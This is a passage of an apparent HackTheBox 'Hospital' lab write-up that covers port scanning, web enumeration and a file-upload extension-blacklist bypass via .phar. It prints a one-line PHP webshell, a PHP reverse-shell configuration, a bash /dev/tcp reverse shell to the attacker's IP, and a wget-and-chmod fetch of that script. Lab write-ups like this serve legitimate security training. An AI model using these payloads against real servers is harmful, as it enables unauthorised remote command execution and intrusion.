+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.129.160.0
+</span></span><span class="line"><span class="cl">Host is up (0.053s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE           VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
+</span></span><span class="line"><span class="cl">53/tcp   open  domain?
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-19 02:48:34Z)
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=DC
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2023-09-06T10:49:03
+</span></span><span class="line"><span class="cl">|_Not valid after:  2028-09-06T10:49:03
+</span></span><span class="line"><span class="cl">443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+</span></span><span class="line"><span class="cl">|_ssl-date: TLS randomness does not represent time
+</span></span><span class="line"><span class="cl">| tls-alpn: 
+</span></span><span class="line"><span class="cl">|_  http/1.1
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=localhost
+</span></span><span class="line"><span class="cl">| Not valid before: 2009-11-10T23:48:47
+</span></span><span class="line"><span class="cl">|_Not valid after:  2019-11-08T23:48:47
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+</span></span><span class="line"><span class="cl">|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">1801/tcp open  msmq?
+</span></span><span class="line"><span class="cl">2103/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">2105/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">2107/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">2179/tcp open  vmrdp?
+</span></span><span class="line"><span class="cl">3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=DC
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2023-09-06T10:49:03
+</span></span><span class="line"><span class="cl">|_Not valid after:  2028-09-06T10:49:03
+</span></span><span class="line"><span class="cl">3269/tcp open  globalcatLDAPssl?
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=DC
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2023-09-06T10:49:03
+</span></span><span class="line"><span class="cl">|_Not valid after:  2028-09-06T10:49:03
+</span></span><span class="line"><span class="cl">3389/tcp open  ms-wbt-server     Microsoft Terminal Services
+</span></span><span class="line"><span class="cl">| rdp-ntlm-info: 
+</span></span><span class="line"><span class="cl">|   Target_Name: HOSPITAL
+</span></span><span class="line"><span class="cl">|   NetBIOS_Domain_Name: HOSPITAL
+</span></span><span class="line"><span class="cl">|   NetBIOS_Computer_Name: DC
+</span></span><span class="line"><span class="cl">|   DNS_Domain_Name: hospital.htb
+</span></span><span class="line"><span class="cl">|   DNS_Computer_Name: DC.hospital.htb
+</span></span><span class="line"><span class="cl">|   DNS_Tree_Name: hospital.htb
+</span></span><span class="line"><span class="cl">|   Product_Version: 10.0.17763
+</span></span><span class="line"><span class="cl">|_  System_Time: 2023-11-19T02:50:51+00:00
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=DC.hospital.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2023-09-05T18:39:34
+</span></span><span class="line"><span class="cl">|_Not valid after:  2024-03-06T18:39:34
+</span></span><span class="line"><span class="cl">5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">|_http-title: Not Found
+</span></span><span class="line"><span class="cl">6059/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">6404/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">6407/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">6409/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">6614/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">6634/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
+</span></span><span class="line"><span class="cl">| http-title: Login
+</span></span><span class="line"><span class="cl">|_Requested resource was login.php
+</span></span><span class="line"><span class="cl">|_http-open-proxy: Proxy might be redirecting requests
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.55 (Ubuntu)
+</span></span><span class="line"><span class="cl">| http-cookie-flags: 
+</span></span><span class="line"><span class="cl">|   /: 
+</span></span><span class="line"><span class="cl">|     PHPSESSID: 
+</span></span><span class="line"><span class="cl">|_      httponly flag not set
+</span></span><span class="line"><span class="cl">9389/tcp open  mc-nmf            .NET Message Framing
+</span></span><span class="line"><span class="cl">Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl">| smb2-time: 
+</span></span><span class="line"><span class="cl">|   date: 2023-11-19T02:50:52
+</span></span><span class="line"><span class="cl">|_  start_date: N/A
+</span></span><span class="line"><span class="cl">| smb2-security-mode: 
+</span></span><span class="line"><span class="cl">|   3:1:1: 
+</span></span><span class="line"><span class="cl">|_    Message signing enabled and required
+</span></span><span class="line"><span class="cl">|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 185.10 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Despite being listed as a Windows machine, we can see an open ssh port enumerated as an ubuntu service. Additionally, port 8080 is running Apache httpd Ubuntu. Quite peculiar. Otherwise, this machine clearly looks like a Domain Controller for Active Directory. Before all else, it is good to create an entry in the /etc/hosts file for this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ cat /etc/hosts
+</span></span><span class="line"><span class="cl">127.0.0.1       localhost
+</span></span><span class="line"><span class="cl">127.0.1.1       kali
+</span></span><span class="line"><span class="cl">::1             localhost ip6-localhost ip6-loopback
+</span></span><span class="line"><span class="cl">ff02::1         ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2         ip6-allrouters
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">10.129.160.0 hospital.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Visiting the main page on HTTPS (443), we see a webmail login entry:</p>
+<p><img src="/post/hackthebox-hospital/Images/landingpage.png"
+	width="992"
+	height="512"
+	srcset="/post/hackthebox-hospital/Images/landingpage_hu809c9687f9c2e7814ee261f446c85707_18041_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/landingpage_hu809c9687f9c2e7814ee261f446c85707_18041_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="193"
+		data-flex-basis="465px"
+	
+></p>
+<p>Enumerating directories with feroxbuster:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Hospital]
+</span></span><span class="line"><span class="cl">└─$ feroxbuster -u https://hospital.htb -k
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> ___  ___  __   __     __      __         __   ___
+</span></span><span class="line"><span class="cl">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+</span></span><span class="line"><span class="cl">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+</span></span><span class="line"><span class="cl">by Ben &#34;epi&#34; Risher 🤓                 ver: 2.10.0
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">403      GET       11l       47w      422c https://hospital.htb/phpmyadmin
+</span></span><span class="line"><span class="cl">200      GET      243l     2447w   262502c https://hospital.htb/plugins/jqueryui/js/jquery-ui.min.js
+</span></span><span class="line"><span class="cl">200      GET       97l      333w     5322c https://hospital.htb/
+</span></span><span class="line"><span class="cl">301      GET        9l       30w      343c https://hospital.htb/installer =&gt; https://hospital.htb/installer/
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Feroxbuster identifies <code>installer</code> as a subdirectory, which we now can tell very clearly that the web server is running <code>roundcube</code>:</p>
+<p><img src="/post/hackthebox-hospital/Images/installer.png"
+	width="631"
+	height="276"
+	srcset="/post/hackthebox-hospital/Images/installer_huf7dfa4d7139392f6a422f524a2693a05_27616_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/installer_huf7dfa4d7139392f6a422f524a2693a05_27616_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="228"
+		data-flex-basis="548px"
+	
+></p>
+<p>There is also the open HTTP page on port 8080. Visiting this, we see another login page with a critical difference. In this one it appears we can create an account:</p>
+<p><img src="/post/hackthebox-hospital/Images/httplandingpage.png"
+	width="964"
+	height="397"
+	srcset="/post/hackthebox-hospital/Images/httplandingpage_hu4e147a65cb3964222358b85b6b646925_279116_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/httplandingpage_hu4e147a65cb3964222358b85b6b646925_279116_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="242"
+		data-flex-basis="582px"
+	
+></p>
+<p>Upon creating an account and logging in, we can see there is an upload functionality for us:</p>
+<p><img src="/post/hackthebox-hospital/Images/upload.png"
+	width="707"
+	height="417"
+	srcset="/post/hackthebox-hospital/Images/upload_hu5ed653c727778b8a91bf869f1e7cff5c_193229_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/upload_hu5ed653c727778b8a91bf869f1e7cff5c_193229_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="169"
+		data-flex-basis="406px"
+	
+></p>
+<p>With another feroxbuster, we can see the files are likely going to <code>http://hospital.htb:8080/uploads/</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Hospital</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">feroxbuster</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">hospital</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8080</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">___</span>  <span class="n">___</span>  <span class="n">__</span>   <span class="n">__</span>     <span class="n">__</span>      <span class="n">__</span>         <span class="n">__</span>   <span class="n">___</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">__</span>  <span class="o">|</span><span class="n">__</span>  <span class="o">|</span><span class="n">__</span><span class="p">)</span> <span class="o">|</span><span class="n">__</span><span class="p">)</span> <span class="o">|</span> <span class="o">/</span>  <span class="err">`</span>    <span class="o">/</span>  \ \<span class="n">_</span><span class="o">/</span> <span class="o">|</span> <span class="o">|</span>  \ <span class="o">|</span><span class="n">__</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>    <span class="o">|</span><span class="n">___</span> <span class="o">|</span>  \ <span class="o">|</span>  \ <span class="o">|</span> \<span class="n">__</span><span class="p">,</span>    \<span class="n">__</span><span class="o">/</span> <span class="o">/</span> \ <span class="o">|</span> <span class="o">|</span><span class="n">__</span><span class="o">/</span> <span class="o">|</span><span class="n">___</span>
+</span></span><span class="line"><span class="cl"><span class="n">by</span> <span class="n">Ben</span> <span class="s2">&#34;epi&#34;</span> <span class="n">Risher</span> <span class="err">🤓</span>                 <span class="n">ver</span><span class="p">:</span> <span class="mf">2.10</span><span class="o">.</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="mi">302</span>      <span class="n">GET</span>        <span class="mi">0</span><span class="n">l</span>        <span class="mi">0</span><span class="n">w</span>        <span class="mi">0</span><span class="n">c</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">hospital</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span> <span class="o">=&gt;</span> <span class="n">login</span><span class="o">.</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="mi">301</span>      <span class="n">GET</span>        <span class="mi">9</span><span class="n">l</span>       <span class="mi">28</span><span class="n">w</span>      <span class="mi">320</span><span class="n">c</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">hospital</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">images</span> <span class="o">=&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">hospital</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">images</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="mi">301</span>      <span class="n">GET</span>        <span class="mi">9</span><span class="n">l</span>       <span class="mi">28</span><span class="n">w</span>      <span class="mi">321</span><span class="n">c</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">hospital</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">uploads</span> <span class="o">=&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">hospital</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="foothold-1">Foothold 1</h2>
+<h3 id="abusing-file-upload-capabilities">Abusing file upload capabilities</h3>
+<p>If we try to upload a non-image file, we are redirected to a failure page. This is best visualized in burpsuite:</p>
+<p><img src="/post/hackthebox-hospital/Images/fail.png"
+	width="689"
+	height="504"
+	srcset="/post/hackthebox-hospital/Images/fail_hudf8dc42174c068b616303b4340086cf0_49746_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/fail_hudf8dc42174c068b616303b4340086cf0_49746_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="328px"
+	
+></p>
+<p>By altering the filename extension, we can tell very quickly that this is an extension blacklist going on. A simple bypass might be to include uppercase letters, ex &ldquo;.pHp&rdquo;, however this does not work.</p>
+<p><img src="/post/hackthebox-hospital/Images/success.png"
+	width="693"
+	height="445"
+	srcset="/post/hackthebox-hospital/Images/success_hufb3a9ff61b979d94cef3333a4d259a20_45688_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/success_hufb3a9ff61b979d94cef3333a4d259a20_45688_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Extension .ph is considered a success while .php is failure, suggesting that failure occurs when certain extensions are identified."
+	
+	
+		class="gallery-image" 
+		data-flex-grow="155"
+		data-flex-basis="373px"
+	
+></p>
+<p>We can try a <a class="link" href="https://book.hacktricks.xyz/pentesting-web/file-upload"  target="_blank" rel="noopener"
+    >list of alternative extensions</a> that might not be blacklisted. Eventually, we might find an extension that is accepted, but also treated as php: <code>.phar</code>.</p>
+<p><img src="/post/hackthebox-hospital/Images/phar1.png"
+	width="686"
+	height="457"
+	srcset="/post/hackthebox-hospital/Images/phar1_hu2e50950685341ab93810e0ea589fc94b_46383_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/phar1_hu2e50950685341ab93810e0ea589fc94b_46383_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="150"
+		data-flex-basis="360px"
+	
+></p>
+<p>When visiting the reverse shell link, we see an error message. In other cases where the file is not treated as php, we would instead see our php code reflected as raw text.</p>
+<p><img src="/post/hackthebox-hospital/Images/phar2.png"
+	width="854"
+	height="199"
+	srcset="/post/hackthebox-hospital/Images/phar2_hu1e87f8e93bfa9bc0d80a120b44fea6e6_16522_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/phar2_hu1e87f8e93bfa9bc0d80a120b44fea6e6_16522_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="429"
+		data-flex-basis="1029px"
+	
+></p>
+<p>On my nc listener, I also see a brief connection request, but the connection fails.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Hospital]
+</span></span><span class="line"><span class="cl">└─$ nc -nvlp 8888
+</span></span><span class="line"><span class="cl">listening on [any] 8888 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.134] from (UNKNOWN) [10.129.160.0] 6524
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="troubleshooting-php-payloads">Troubleshooting php payloads</h4>
+<p>My first thinking is that because this is a Windows machine, the php reverse shell is not working correctly since the payload is for Linux. We can see this when we look at the <code>$shell</code> line:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Hospital]
+</span></span><span class="line"><span class="cl">└─$ head php-reverse-shell.php 
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">set_time_limit (0);
+</span></span><span class="line"><span class="cl">$VERSION = &#34;1.0&#34;;
+</span></span><span class="line"><span class="cl">$ip = &#39;10.10.14.134&#39;;  // CHANGE THIS
+</span></span><span class="line"><span class="cl">$port = 8888;       // CHANGE THIS
+</span></span><span class="line"><span class="cl">$chunk_size = 1400;
+</span></span><span class="line"><span class="cl">$write_a = null;
+</span></span><span class="line"><span class="cl">$error_a = null;
+</span></span><span class="line"><span class="cl">$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next, I tried an extremely simple webshell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Hospital]
+</span></span><span class="line"><span class="cl">└─$ cat ws.phar                                        
+</span></span><span class="line"><span class="cl">&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]); ?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The upload works as intended, but there is no output and commands do not reach my nc listener anymore.</p>
+<p><img src="/post/hackthebox-hospital/Images/phar3.png"
+	width="706"
+	height="140"
+	srcset="/post/hackthebox-hospital/Images/phar3_hubae8ba7edb73954bf5c517ea5006c2a7_8376_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/phar3_hubae8ba7edb73954bf5c517ea5006c2a7_8376_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="504"
+		data-flex-basis="1210px"
+	
+></p>
+<p>After trying a few more things, I land on a working solution: <a class="link" href="https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php"  target="_blank" rel="noopener"
+    >WhiteWinterWolf&rsquo;s php webshell</a></p>
+<p><img src="/post/hackthebox-hospital/Images/phar4.png"
+	width="902"
+	height="255"
+	srcset="/post/hackthebox-hospital/Images/phar4_hub480a610f6c2331b2de65476dcc741e4_31807_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/phar4_hub480a610f6c2331b2de65476dcc741e4_31807_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="353"
+		data-flex-basis="848px"
+	
+></p>
+<p>In a bit of a surprise twist, we are seeing a Linux filesystem and Linux shell commands! It appears the nmap enumeration did not lie, and we are in some sort of Linux container.
+To transition into a reverse shell, I uploaded a bash script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Hospital<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cat rev.sh  
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.134/8888 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To upload, I use python simple http server:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Hospital]
+</span></span><span class="line"><span class="cl">└─$ python -m http.server 80
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In webshell, wget and chmod:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wget 10.10.14.134/rev.sh &amp;&amp; chmod +x rev.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/post/hackthebox-hospital/Images/reverse.png"
+	width="781"
+	height="376"
+	srcset="/post/hackthebox-hospital/Images/reverse_hueee5d171f8b9b54f3582da8caf660f7a_48622_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/reverse_hueee5d171f8b9b54f3582da8caf660f7a_48622_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="207"
+		data-flex-basis="498px"
+	
+></p>
+<p>We can check with <code>ls -l</code>:</p>
+<p><img src="/post/hackthebox-hospital/Images/x.png"
+	width="836"
+	height="260"
+	srcset="/post/hackthebox-hospital/Images/x_hucc7ec80072939bf7d17fd468a8468650_27477_480x0_resize_box_3.png 480w, /post/hackthebox-hospital/Images/x_hucc7ec80072939bf7d17fd468a8468650_27477_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="321"
+		data-flex-basis="771px"
+	
+></p>
+<p>And now, we can run the reverse shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./rev.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Back on the kali listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Hospital</span><span class="p">]</span>
